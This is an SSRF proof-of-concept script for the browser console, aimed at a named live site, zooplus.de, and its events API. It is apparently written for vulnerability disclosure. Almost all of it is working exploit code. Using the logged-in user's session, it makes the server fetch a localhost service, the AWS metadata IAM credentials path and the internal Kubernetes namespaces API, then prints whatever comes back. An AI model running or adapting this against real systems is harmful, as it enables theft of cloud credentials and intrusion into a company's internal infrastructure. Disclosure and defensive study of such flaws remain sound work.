// ==============================================================================
// SSRF Proof of Concept - Browser Console Version
// ==============================================================================
// Execute this in DevTools Console on www.zooplus.de (while logged in)
//
// Instructions:
// 1. Login to www.zooplus.de
// 2. Open DevTools (F12)
// 3. Go to Console tab
// 4. Paste and execute this entire script
// 5. Observe the results in the console
// ==============================================================================

console.log("%c[SSRF PoC] Starting tests...", "color:red;font-size:20px;font-weight:bold");
console.log("=".repeat(70));

const endpoint = "https://www.zooplus.de/zootopia-events/api/events/sites/1";

// Test 1: Internal Service (Primary Proof)
console.log("\n%c[Test 1] Internal Service - Header Reflection", "color:blue;font-size:16px;font-weight:bold");
fetch(endpoint, {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({url: "http://127.0.0.1:8080"})
})
.then(async (response) => {
  console.log("Status:", response.status);
  console.log("Headers:");
  response.headers.forEach((value, key) => {
    console.log(`  ${key}: ${value}`);
  });

  // Check for istio-envoy header
  const server = response.headers.get('server');
  if (server === 'istio-envoy') {
    console.log("%c[!] SSRF CONFIRMED!", "color:red;font-size:24px;font-weight:bold");
    console.log("%c'istio-envoy' header found - proves internal request", "color:red;font-size:16px");
  }

  const text = await response.text();
  console.log("Response:", text);
})
.catch(e => console.error("Error:", e));

// Test 2: AWS Metadata Service
setTimeout(() => {
  console.log("\n%c[Test 2] AWS Metadata Service", "color:blue;font-size:16px;font-weight:bold");
  fetch(endpoint, {
    method: "POST",
    credentials: "include",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"})
  })
  .then(async (response) => {
    console.log("AWS Metadata Status:", response.status);
    if (response.status === 200) {
      console.log("%c[!] AWS Metadata accessible via SSRF", "color:orange;font-size:16px");
    }
    const text = await response.text();
    console.log("Response:", text);
  })
  .catch(e => console.error("Error:", e));
}, 2000);

// Test 3: Kubernetes API
setTimeout(() => {
  console.log("\n%c[Test 3] Kubernetes API", "color:blue;font-size:16px;font-weight:bold");
  fetch(endpoint, {
    method: "POST",
    credentials: "include",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({url: "https://kubernetes.default.svc/api/v1/namespaces"})
  })
  .then(async (response) => {
    console.log("Kubernetes API Status:", response.status);
    if (response.status === 200) {
      console.log("%c[!] Kubernetes API accessible via SSRF", "color:orange;font-size:16px");
    }
    const text = await response.text();
    console.log("Response:", text);
  })
  .catch(e => console.error("Error:", e));
}, 4000);

console.log("\n%c[Info] Tests initiated. Results will appear above.", "color:green;font-size:14px");
